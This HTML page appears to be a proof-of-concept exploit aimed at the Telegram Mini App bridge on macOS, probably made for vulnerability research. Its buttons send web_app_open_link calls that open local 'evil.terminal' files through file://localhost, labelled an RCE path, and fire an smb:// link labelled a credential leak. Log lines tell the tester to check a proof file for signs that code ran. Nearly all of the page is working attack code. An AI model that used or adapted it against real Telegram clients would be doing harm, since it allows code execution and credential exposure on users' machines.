<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>F-16 Runtime Test</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
body { font-family: monospace; padding: 16px; background: #0a0a0a; color: #e0e0e0; }
button { background: #1a3a1a; color: #44ff44; border: 1px solid #44ff44;
         padding: 10px 18px; font-size: 15px; cursor: pointer; margin: 4px; }
#log { margin-top: 12px; padding: 10px; border: 1px solid #444; min-height: 100px;
       white-space: pre-wrap; font-size: 12px; color: #aaffaa; background: #040404; }
</style>
</head>
<body>
<h3 style="color:#ff6b35">F-16: web_app_open_link Runtime Test</h3>
<button onclick="testFileLocalhost()">Test file://localhost (F-16)</button>
<button onclick="testSMB()">Test smb:// (credential leak)</button>
<button onclick="testTerminal()">Test .terminal (RCE path)</button>
<div id="log">ready...</div>
<script>
const tg = window.Telegram && window.Telegram.WebApp;
const LOG = document.getElementById('log');
function log(s) { LOG.textContent += new Date().toISOString().slice(11,19)+' '+s+'\n'; }

// Primary: webkit bridge (same as confirmed F-16 path)
function sendLink(url) {
  log('→ openLink: ' + url.substring(0,60));
  if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.performAction) {
    window.webkit.messageHandlers.performAction.postMessage({
      eventName: "web_app_open_link",
      eventData: JSON.stringify({ url: url })
    });
    log('  webkit bridge fired');
  } else if (tg) {
    tg.openLink(url);
    log('  tg.openLink fired');
  } else {
    log('  ERROR: no bridge');
  }
}

// Test 1: open /tmp/evil.terminal via file://localhost
function testFileLocalhost() {
  log('=== TEST: file://localhost .terminal ===');
  // This file exists, no quarantine, was confirmed to execute via open command
  sendLink("file://localhost/tmp/evil.terminal");
  setTimeout(() => log('[check /tmp/tg_rce_proof_f21 mtime for update]'), 2000);
}

// Test 2: smb:// should trigger credential dialog (visual proof of NSWorkspace call)
function testSMB() {
  log('=== TEST: smb:// (should show macOS auth dialog) ===');
  sendLink("smb://test.local/share");
  log('  if macOS shows a dialog -> NSWorkspace confirmed reachable');
}

// Test 3: .terminal in TempBox manually placed file
function testTerminal() {
  log('=== TEST: .terminal in TempBox (no quarantine) ===');
  var path = "file://localhost/Users/david/Library/Group%20Containers/" +
             "6N38VWS5BX.ru.keepcoder.Telegram/stable/temp/app/0/evil.terminal";
  sendLink(path);
  setTimeout(() => log('[check /tmp/tg_rce_proof_f21 for timestamp change]'), 3000);
}

window.addEventListener('load', function() {
  log('webkit bridge: ' + !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.performAction));
  log('Telegram.WebApp: ' + !!tg);
});
</script>
</body>
</html>
